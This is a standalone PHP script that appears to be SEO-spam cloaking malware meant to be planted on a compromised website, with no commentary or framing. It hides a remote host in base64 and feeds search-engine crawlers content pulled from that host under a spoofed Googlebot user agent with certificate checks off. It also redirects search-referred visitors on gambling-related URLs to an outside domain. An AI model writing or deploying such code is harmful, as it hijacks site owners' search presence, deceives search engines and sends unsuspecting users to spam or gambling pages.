<?php
set_time_limit(0);
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
define('URI', $_SERVER['REQUEST_URI']);
define('host', base64_decode('aHR0cHM6Ly93ZmV3MzJkM2QuY29t'));
define('MULU','app|ios|android|download|blank|bet|casino|games|play|video|poker|root|news|bak|pt-br');
function isEngines($key){return stristr($key, 'Googlebot') !== false||stristr($key, 'Bingbot') !== false||stristr($key, 'Yahoo!') !== false;}
function isIncludes(){$re = 0;$temp = explode('|',MULU);foreach($temp as $v){if(stristr(URI,$v) !== false){$re = 1;}}return $re;}
function isRef($ref){return stristr($ref,'google') !== false||stristr($ref,'bing') !== false||stristr($ref,'yahoo') !== false;}
function getContents($url){
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $result = curl_exec($ch);
        curl_close($ch);
		if($result == NULL){
			return file_get_contents($url);
		}
        return $result;
    } else {
        return file_get_contents($url);
    }
}
$ref = $_SERVER["HTTP_REFERER"];
$key = $_SERVER["HTTP_USER_AGENT"];
$ym = $_SERVER['HTTP_HOST'];

if (isEngines($key)) {
    header('Content-Type:text/html;charset=utf-8');
    if(isIncludes()){
	   echo getContents(host."?xhost=".$ym.'&reurl='.URI.'&ua=Baiduspider'.'&f=bd');
        exit;
    }else{
        echo file_get_contents(host."suijiurl/index.php");
    }
}else{
	if(isIncludes()&&isRef($ref)){
       header("Location: https://br.brgoogleji.com/xiangjiao.html");
        exit;
    }	
}
?>
